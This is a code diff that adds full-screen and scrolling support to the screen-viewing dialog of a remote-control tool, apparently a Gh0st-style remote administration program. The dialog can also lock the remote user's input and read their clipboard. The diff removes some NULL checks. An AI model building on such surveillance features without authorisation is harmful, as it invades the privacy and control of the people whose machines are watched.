@@ -12,6 +12,7 @@
 enum
 {
 	IDM_CONTROL = 0x1010,
+	IDM_FULLSCREEN, 
 	IDM_SEND_CTRL_ALT_DEL,
 	IDM_TRACE_CURSOR,	// 跟踪显示远程鼠标
 	IDM_BLOCK_INPUT,	// 锁定远程计算机输入
@@ -24,9 +25,11 @@ IMPLEMENT_DYNAMIC(CScreenSpyDlg, CDialog)
 
 #define ALGORITHM_DIFF 1
 
-	CScreenSpyDlg::CScreenSpyDlg(CWnd* Parent, IOCPServer* IOCPServer, CONTEXT_OBJECT* ContextObject)
+CScreenSpyDlg::CScreenSpyDlg(CWnd* Parent, IOCPServer* IOCPServer, CONTEXT_OBJECT* ContextObject)
 	: CDialog(CScreenSpyDlg::IDD, Parent)
 {
+	m_bFullScreen = FALSE;
+
 	m_iocpServer	= IOCPServer;
 	m_ContextObject	= ContextObject;
 
@@ -47,17 +50,8 @@ IMPLEMENT_DYNAMIC(CScreenSpyDlg, CDialog)
 	m_ulHScrollPos = 0;
 	m_ulVScrollPos = 0;
 
-	if (m_ContextObject==NULL)
-	{
-		return;
-	}
 	ULONG	ulBitmapInforLength = m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1;
 	m_BitmapInfor_Full = (BITMAPINFO *) new BYTE[ulBitmapInforLength];
-
-	if (m_BitmapInfor_Full==NULL)
-	{
-		return;
-	}
 
 	memcpy(m_BitmapInfor_Full, m_ContextObject->InDeCompressedBuffer.GetBuffer(1), ulBitmapInforLength);
 
@@ -101,6 +95,14 @@ BEGIN_MESSAGE_MAP(CScreenSpyDlg, CDialog)
 	ON_WM_CLOSE()
 	ON_WM_PAINT()
 	ON_WM_SYSCOMMAND()
+	ON_WM_HSCROLL()
+	ON_WM_VSCROLL()
+	ON_WM_LBUTTONDOWN()
+	ON_WM_LBUTTONUP()
+	ON_WM_MOUSEWHEEL()
+	ON_WM_MOUSEMOVE()
+	ON_WM_KILLFOCUS()
+	ON_WM_SIZE()
 END_MESSAGE_MAP()
 
 
@@ -132,6 +134,7 @@ BOOL CScreenSpyDlg::OnInitDialog()
 	{
 		SysMenu->AppendMenu(MF_SEPARATOR);
 		SysMenu->AppendMenu(MF_STRING, IDM_CONTROL, "控制屏幕(&Y)");
+		SysMenu->AppendMenu(MF_STRING, IDM_FULLSCREEN, "全屏(&F)");
 		SysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, "跟踪被控端鼠标(&T)");
 		SysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, "锁定被控端鼠标和键盘(&L)");
 		SysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, "保存快照(&S)");
@@ -148,8 +151,7 @@ BOOL CScreenSpyDlg::OnInitDialog()
 
 	SendNext();
 
-	return TRUE;  // return TRUE unless you set the focus to a control
-	// 异常: OCX 属性页应返回 FALSE
+	return TRUE;
 }
 
 
@@ -166,19 +168,15 @@ VOID CScreenSpyDlg::OnClose()
 
 VOID CScreenSpyDlg::OnReceiveComplete()
 {
-	if (m_ContextObject==NULL)
-	{
-		return;
-	}
+	assert (m_ContextObject);
 
 	switch(m_ContextObject->InDeCompressedBuffer.GetBuffer()[0])
 	{
 	case TOKEN_FIRSTSCREEN:
 		{
-			DrawFirstScreen();            //这里显示第一帧图像 一会转到函数定义
+			DrawFirstScreen();
 			break;
 		}
-
 	case TOKEN_NEXTSCREEN:
 		{
 			if (m_ContextObject->InDeCompressedBuffer.GetBuffer(0)[1]==ALGORITHM_DIFF)
@@ -187,10 +185,10 @@ VOID CScreenSpyDlg::OnReceiveComplete()
 			}
 			break;
 		}
-
-	case TOKEN_CLIPBOARD_TEXT:            //给你
+	case TOKEN_CLIPBOARD_TEXT:
 		{
-			UpdateServerClipboard((char*)m_ContextObject->InDeCompressedBuffer.GetBuffer(1), m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1);
+			UpdateServerClipboard((char*)m_ContextObject->InDeCompressedBuffer.GetBuffer(1), 
+				m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1);
 			break;
 		}
 	}
@@ -237,7 +235,6 @@ VOID CScreenSpyDlg::DrawNextScreenDiff(void)
 
 	//lodsd指令从ESI指向的内存位置4个字节内容放入EAX中并且下移4
 	//movsb指令字节传送数据，通过SI和DI这两个寄存器控制字符串的源地址和目标地址
-
 	//m_rectBuffer [0002 esi0002 esi000A 000C]     [][]edi[][][][][][][][][][][][][][][][][]
 	__asm
 	{
@@ -268,8 +265,6 @@ CopyEnd:
 void CScreenSpyDlg::OnPaint()
 {
 	CPaintDC dc(this); // device context for painting
-	// TODO: 在此处添加消息处理程序代码
-	// 不为绘图消息调用 CDialog::OnPaint()
 
 	if (m_bIsFirst)
 	{
@@ -310,8 +305,7 @@ VOID CScreenSpyDlg::DrawTipString(CString strString)
 	//ExtTextOut函数可以提供一个可供选择的矩形，用当前选择的字体、背景颜色和正文颜色来绘制一个字符串
 	ExtTextOut(m_hFullDC, 0, 0, ETO_OPAQUE, &Rect, NULL, 0, NULL);
 
-	DrawText (m_hFullDC, strString, -1, &Rect,
-		DT_SINGLELINE | DT_CENTER | DT_VCENTER);
+	DrawText (m_hFullDC, strString, -1, &Rect,DT_SINGLELINE | DT_CENTER | DT_VCENTER);
 
 	SetBkColor(m_hFullDC, BackgroundColor);
 	SetTextColor(m_hFullDC, OldBackgroundColor);
@@ -321,7 +315,6 @@ VOID CScreenSpyDlg::DrawTipString(CString strString)
 void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 {
 	// TODO: 在此添加消息处理程序代码和/或调用默认值
-
 	CMenu* SysMenu = GetSystemMenu(FALSE);
 
 	switch (nID)
@@ -329,8 +322,13 @@ void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 	case IDM_CONTROL:
 		{
 			m_bIsCtrl = !m_bIsCtrl;
-			SysMenu->CheckMenuItem(IDM_CONTROL, m_bIsCtrl ? MF_CHECKED : MF_UNCHECKED);   //菜单样式
-
+			SysMenu->CheckMenuItem(IDM_CONTROL, m_bIsCtrl ? MF_CHECKED : MF_UNCHECKED);
+			break;
+		}
+	case IDM_FULLSCREEN: // 全屏
+		{
+			EnterFullScreen();
+			SysMenu->CheckMenuItem(IDM_FULLSCREEN, MF_CHECKED); //菜单样式
 			break;
 		}
 	case IDM_SAVEDIB:    // 快照保存
@@ -338,7 +336,6 @@ void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 			SaveSnapshot();
 			break;
 		}
-
 	case IDM_TRACE_CURSOR: // 跟踪被控端鼠标
 		{	
 			m_bIsTraceCursor = !m_bIsTraceCursor; //这里在改变数据
@@ -346,10 +343,8 @@ void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 
 			// 重绘消除或显示鼠标
 			OnPaint();
-
 			break;
 		}
-
 	case IDM_BLOCK_INPUT: // 锁定服务端鼠标和键盘
 		{
 			BOOL bIsChecked = SysMenu->GetMenuState(IDM_BLOCK_INPUT, MF_BYCOMMAND) & MF_CHECKED;
@@ -359,21 +354,17 @@ void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 			bToken[0] = COMMAND_SCREEN_BLOCK_INPUT;
 			bToken[1] = !bIsChecked;
 			m_iocpServer->OnClientPreSending(m_ContextObject, bToken, sizeof(bToken));
-
 			break;
 		}
-	case IDM_GET_CLIPBOARD:            //想要Client的剪贴板内容
+	case IDM_GET_CLIPBOARD: //想要Client的剪贴板内容
 		{
 			BYTE	bToken = COMMAND_SCREEN_GET_CLIPBOARD;
 			m_iocpServer->OnClientPreSending(m_ContextObject, &bToken, sizeof(bToken));
-
 			break;
 		}
-
-	case IDM_SET_CLIPBOARD:              //给他
+	case IDM_SET_CLIPBOARD: //给他
 		{
 			SendServerClipboard();
-
 			break;
 		}
 	}
@@ -421,6 +412,8 @@ BOOL CScreenSpyDlg::PreTranslateMessage(MSG* pMsg)
 		}
 		if (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE)
 			return true;
+		if (pMsg->wParam == VK_F11) // 退出全屏
+			LeaveFullScreen();
 		break;
 	}
 
@@ -453,12 +446,11 @@ BOOL CScreenSpyDlg::SaveSnapshot(void)
 	CFile	File;
 	if (!File.Open( Dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
 	{
-
 		return FALSE;
 	}
 
 	// BITMAPINFO大小
-	//+ (BitMapInfor->bmiHeader.biBitCount > 16 ? 1 : (1 << BitMapInfor->bmiHeader.biBitCount)) * sizeof(RGBQUAD);
+	//+ (BitMapInfor->bmiHeader.biBitCount > 16 ? 1 : (1 << BitMapInfor->bmiHeader.biBitCount)) * sizeof(RGBQUAD)
 	//bmp  fjkdfj  dkfjkdfj [][][][]
 	int	nbmiSize = sizeof(BITMAPINFO);
 
@@ -517,4 +509,175 @@ VOID CScreenSpyDlg::SendServerClipboard(void)
 	::CloseClipboard();
 	m_iocpServer->OnClientPreSending(m_ContextObject,(PBYTE)szBuffer, iPacketLength);
 	delete[] szBuffer;
+}
+
+
+void CScreenSpyDlg::OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
+{
+	SCROLLINFO si = {sizeof(si)};
+	si.fMask = SIF_ALL;
+	GetScrollInfo(SB_HORZ, &si);
+
+	int nPrevPos = si.nPos;
+	switch(nSBCode)
+	{
+	case SB_LEFT:
+		si.nPos = si.nMin;
+		break;
+	case SB_RIGHT:
+		si.nPos = si.nMax;
+		break;
+	case SB_LINELEFT:
+		si.nPos -= 8;
+		break;
+	case SB_LINERIGHT:
+		si.nPos += 8;
+		break;
+	case SB_PAGELEFT:
+		si.nPos -= si.nPage;
+		break;
+	case SB_PAGERIGHT:
+		si.nPos += si.nPage;
+		break;
+	case SB_THUMBTRACK:
+		si.nPos = si.nTrackPos;
+		break;
+	default:
+		break;
+	}
+	si.fMask = SIF_POS;
+	SetScrollInfo(SB_HORZ, &si, TRUE);
+	if (si.nPos != nPrevPos)
+	{
+		m_ulHScrollPos += si.nPos - nPrevPos;
+		ScrollWindow(nPrevPos - si.nPos, 0, NULL, NULL);
+	}
+
+	CDialog::OnHScroll(nSBCode, nPrevPos, pScrollBar);
+}
+
+
+void CScreenSpyDlg::OnVScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
+{
+	SCROLLINFO si = {sizeof(si)};
+	si.fMask = SIF_ALL;
+	GetScrollInfo(SB_VERT, &si);
+
+	int nPrevPos = si.nPos;
+	switch(nSBCode)
+	{
+	case SB_TOP:
+		si.nPos = si.nMin;
+		break;
+	case SB_BOTTOM:
+		si.nPos = si.nMax;
+		break;
+	case SB_LINEUP:
+		si.nPos -= 8;
+		break;
+	case SB_LINEDOWN:
+		si.nPos += 8;
+		break;
+	case SB_PAGEUP:
+		si.nPos -= si.nPage;
+		break;
+	case SB_PAGEDOWN:
+		si.nPos += si.nPage;
+		break;
+	case SB_THUMBTRACK:
+		si.nPos = si.nTrackPos;
+		break;
+	default:
+		break;
+	}
+	si.fMask = SIF_POS;
+	SetScrollInfo(SB_VERT, &si, TRUE);
+	if (si.nPos != nPrevPos)
+	{
+		m_ulVScrollPos += si.nPos - nPrevPos;
+		ScrollWindow(0, nPrevPos - si.nPos, NULL, NULL);
+	}
+
+	CDialog::OnVScroll(nSBCode, nPrevPos, pScrollBar);
+}
+
+
+void CScreenSpyDlg::EnterFullScreen()
+{
+	if (!m_bFullScreen)
+	{
+		//get current system resolution
+		int g_iCurScreenWidth = GetSystemMetrics(SM_CXSCREEN);
+		int g_iCurScreenHeight = GetSystemMetrics(SM_CYSCREEN);
+
+		//for full screen while backplay
+		GetWindowPlacement(&m_struOldWndpl);
+
+		CRect rectWholeDlg;//entire client(including title bar)
+		CRect rectClient;//client area(not including title bar)
+		CRect rectFullScreen;
+		GetWindowRect(&rectWholeDlg);
+		RepositionBars(0, 0xffff, AFX_IDW_PANE_FIRST, reposQuery, &rectClient);
+		ClientToScreen(&rectClient);
+
+		rectFullScreen.left = rectWholeDlg.left-rectClient.left;
+		rectFullScreen.top = rectWholeDlg.top-rectClient.top;
+		rectFullScreen.right = rectWholeDlg.right+g_iCurScreenWidth - rectClient.right;
+		rectFullScreen.bottom = rectWholeDlg.bottom+g_iCurScreenHeight - rectClient.bottom;
+		//enter into full screen;
+		WINDOWPLACEMENT struWndpl;
+		struWndpl.length = sizeof(WINDOWPLACEMENT);
+		struWndpl.flags = 0;
+		struWndpl.showCmd = SW_SHOWNORMAL;
+		struWndpl.rcNormalPosition = rectFullScreen;
+		SetWindowPlacement(&struWndpl);
+		m_bFullScreen = true;
+	}
+}
+
+
+void CScreenSpyDlg::LeaveFullScreen()
+{
+	if (m_bFullScreen)
+	{
+		SetWindowPlacement(&m_struOldWndpl);
+		CMenu *SysMenu = GetSystemMenu(FALSE);
+		SysMenu->CheckMenuItem(IDM_FULLSCREEN, MF_UNCHECKED); //菜单样式
+		m_bFullScreen = false;
+	}
+}
+
+void CScreenSpyDlg::OnLButtonDown(UINT nFlags, CPoint point)
+{
+	CDialog::OnLButtonDown(nFlags, point);
+}
+
+
+void CScreenSpyDlg::OnLButtonUp(UINT nFlags, CPoint point)
+{
+	CDialog::OnLButtonUp(nFlags, point);
+}
+
+
+BOOL CScreenSpyDlg::OnMouseWheel(UINT nFlags, short zDelta, CPoint pt)
+{
+	return CDialog::OnMouseWheel(nFlags, zDelta, pt);
+}
+
+
+void CScreenSpyDlg::OnMouseMove(UINT nFlags, CPoint point)
+{
+	CDialog::OnMouseMove(nFlags, point);
+}
+
+
+void CScreenSpyDlg::OnKillFocus(CWnd* pNewWnd)
+{
+	CDialog::OnKillFocus(pNewWnd);
+}
+
+
+void CScreenSpyDlg::OnSize(UINT nType, int cx, int cy)
+{
+	CDialog::OnSize(nType, cx, cy);
 }
